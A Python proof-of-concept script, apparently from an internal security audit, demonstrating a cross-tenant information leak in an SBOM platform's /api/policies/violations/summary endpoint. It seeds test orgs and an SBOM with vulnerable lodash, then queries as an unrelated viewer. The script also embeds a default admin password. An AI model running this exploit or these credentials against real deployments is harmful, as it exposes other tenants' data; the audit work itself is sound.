"""
PoC for SEC-001c — DO NOT RUN against production.
============================================================
Same shape as SEC-001a but for /api/policies/violations/summary.
Demonstrates platform-wide policy violation aggregate is exposed
to any authenticated viewer (CWE-285 Information Exposure).
"""
from __future__ import annotations

import json
import os
import sys
import time
import urllib.error
import urllib.request

API     = os.environ.get("POC_API_URL",        "http://localhost:9100")
ADMIN_U = os.environ.get("POC_ADMIN_USERNAME", "admin")
ADMIN_P = os.environ.get("POC_ADMIN_PASSWORD", "sbom@2024")

STAMP = int(time.time())
ORGA_NAME = f"POC-001c-OrgA-{STAMP}"
ORGB_NAME = f"POC-001c-OrgB-{STAMP}"
VIEWERA   = f"poc-vA-{STAMP}"
VIEWERB   = f"poc-vB-{STAMP}"
PASSWORD  = "PocViewer2026!"

# CycloneDX with one component carrying a known-vulnerable PURL.
# The OSV scan that runs on /sbom upload will assign vulns to it,
# which is what /policies/violations/summary aggregates over.
SBOM = {
    "bomFormat": "CycloneDX", "specVersion": "1.4", "version": 1,
    "components": [{
        "type": "library", "name": "lodash", "version": "4.17.20",
        "purl": "pkg:npm/lodash@4.17.20",   # CVE-2021-23337 territory
    }],
}


def _req(path, method="GET", body=None, token=None):
    headers = {}
    if token: headers["Authorization"] = f"Bearer {token}"
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(f"{API}{path}", data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, (json.loads(resp.read() or b"null"))
    except urllib.error.HTTPError as e:
        text = e.read().decode("utf-8", errors="replace")
        try: return e.code, json.loads(text)
        except: return e.code, text


def _upload_sbom(release_id, token):
    boundary = f"----PocBoundary{STAMP}"
    sbom_bytes = json.dumps(SBOM).encode()
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="poc.cdx.json"\r\n'
            f"Content-Type: application/json\r\n\r\n").encode() + sbom_bytes + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(f"{API}/api/releases/{release_id}/sbom", data=body, method="POST",
        headers={"Authorization": f"Bearer {token}", "Content-Type": f"multipart/form-data; boundary={boundary}"})
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, json.loads(resp.read() or b"null")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")


def main():
    print(f"PoC SEC-001c - leak in /api/policies/violations/summary\n")
    cleanup_org_ids = []
    try:
        code, body = _req("/api/auth/login", "POST", {"username": ADMIN_U, "password": ADMIN_P})
        assert code == 200, f"admin login: {code} {body}"
        admin_tok = body["access_token"]
        print("[1] admin login OK")

        code, body = _req("/api/organizations", "POST",
                          {"name": ORGA_NAME, "username": VIEWERA, "password": PASSWORD}, token=admin_tok)
        orgA_id = body["id"]; cleanup_org_ids.append(orgA_id)
        code, body = _req("/api/organizations", "POST",
                          {"name": ORGB_NAME, "username": VIEWERB, "password": PASSWORD}, token=admin_tok)
        orgB_id = body["id"]; cleanup_org_ids.append(orgB_id)
        print(f"[2] orgA={orgA_id}, orgB={orgB_id}")

        code, body = _req(f"/api/organizations/{orgA_id}/products", "POST",
                          {"name": "poc-prod", "description": "PoC SEC-001c"}, token=admin_tok)
        prodA_id = body["id"]
        code, body = _req(f"/api/products/{prodA_id}/releases", "POST",
                          {"version": "1.0.0-poc", "notes": "PoC SEC-001c"}, token=admin_tok)
        relA_id = body["id"]
        print(f"[3] orgA release {relA_id}")

        code, body = _upload_sbom(relA_id, admin_tok)
        print(f"[4] SBOM uploaded -> HTTP {code}")
        # /sbom upload triggers OSV scan; vulns may take a moment to settle.
        time.sleep(3)

        # Sanity: admin sees policy violation summary (should be > 0 if OSV found vulns)
        code, body = _req("/api/policies/violations/summary", token=admin_tok)
        admin_total = body.get("total_violations", 0) if isinstance(body, dict) else 0
        print(f"[5] admin sees total_violations={admin_total}")

        # Login as viewerB (zero-data org)
        code, body = _req("/api/auth/login", "POST", {"username": VIEWERB, "password": PASSWORD})
        viewerB_tok = body["access_token"]
        print("[6] viewerB logged in")

        # THE EXPLOIT
        code, body = _req("/api/policies/violations/summary", token=viewerB_tok)
        viewer_total = body.get("total_violations", 0) if isinstance(body, dict) else 0
        print(f"[7] viewerB sees total_violations={viewer_total}")
        print()

        if viewer_total > 0:
            print("=" * 70)
            print(f"[LEAK CONFIRMED] viewerB sees {viewer_total} platform-wide policy violations")
            print(f"  but viewerB's org has 0 components — these are orgA's data")
            print("=" * 70)
            verdict = "LEAK"
        elif viewer_total == admin_total == 0:
            print("[NO DATA] OSV scan returned no vulns for the test PURL — cannot conclude")
            print("  Re-run with a known-vulnerable PURL (e.g. log4j-core 2.14.1)")
            verdict = "INCONCLUSIVE"
        else:
            print(f"[NO LEAK] viewerB sees 0 (admin sees {admin_total})")
            verdict = "NO_LEAK"
        return 1 if verdict == "LEAK" else 0
    finally:
        if cleanup_org_ids:
            try:
                code, body = _req("/api/auth/login", "POST", {"username": ADMIN_U, "password": ADMIN_P})
                if code == 200:
                    tok = body["access_token"]
                    for org_id in cleanup_org_ids:
                        c, b = _req(f"/api/organizations/{org_id}", "DELETE", token=tok)
                        print(f"[cleanup] org {org_id} -> {c}")
            except Exception as e:
                print(f"[cleanup FAIL] {e}")


if __name__ == "__main__":
    sys.exit(main())
